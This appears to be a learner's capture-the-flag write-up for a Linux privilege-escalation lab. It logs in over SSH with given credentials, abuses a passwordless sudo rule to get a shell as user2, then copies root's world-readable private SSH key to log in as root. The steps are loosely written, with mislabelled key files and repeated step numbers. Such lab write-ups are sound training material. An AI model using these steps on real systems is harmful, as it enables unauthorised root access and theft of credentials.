# FLag 1: 

 SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.


# Step 1

ssh into the user with leaked creadentials as so: 
``` bash 

ssh user1@94.237.56.194 -p 58386

password: password1

```

# Step 2

Attempt to switch users  with 

``` bash

sudo su user2
```

Output:

``` bash

[sudo] password for user1: 
Sorry, user user1 is not allowed to execute '/usr/bin/su user2' as root on ng-1398741-gettingstartedprivesc-jnfku-66cb6578c4-rk2rs.
```

Switching users was unsuccessfull

# Step 3

List commands available to user1 via 
``` bash

sudo -l

```

Output:
``` bash
Matching Defaults entries for user1 on ng-1398741-gettingstartedprivesc-jnfku-66cb6578c4-rk2rs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-1398741-gettingstartedprivesc-jnfku-66cb6578c4-rk2rs:
    (user2 : user2) NOPASSWD: /bin/bash
```

The output above shows that as user1, we can open a bash shell as user2 with no required password.

# Step 3

launch bash shell as users2 from user1

```bash

user1@ng-1398741-gettingstartedprivesc-jnfku-66cb6578c4-rk2rs:~$ sudo -u user2 /bin/bash
```
I am instantly sent into user2 as seen in the prompt below:

```bash

user2@ng-1398741-gettingstartedprivesc-jnfku-66cb6578c4-rk2rs:/home/user1$ cd ..

```

# Step 3
naviagte to home directory and reveal flag 

```bash
user2@ng-1398741-gettingstartedprivesc-jnfku-66cb6578c4-rk2rs:~$ cat flag.txt 
```


# Flag 2

Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.

# Step 1
See if public ssh key is readable so we can ssh into root without a password. Using the '-l' flag with 'ls' gives us the long listing and displays permission of the file

```bash
user2@ng-1398741-gettingstartedprivesc-jnfku-66cb6578c4-rk2rs:/$ ls -l root/.ssh/id_rsa
```

Output:

```bash
-rw-r--r-- 1 root root 2602 Feb 12  2021 root/.ssh/id_rsa
```
The id_rsa file is readable 

# Step 3 
Copy content of this file onto host machine in a file called id_rsa.

ssh into root with following command

``` bash
ssh root@<ip address> -p port -i rsa_id
```

when i tried this, i was getting an error pretaining to the rsa_id file.

I then compared the word count for the rsa_id file on the target machine and on my machine to ensure I copied the full file. You must have the enitre contents of the file. This is everything between the '-----BEGIN RSA PRIVATE KEY-----' and '-----END RSA PRIVATE KEY-----'















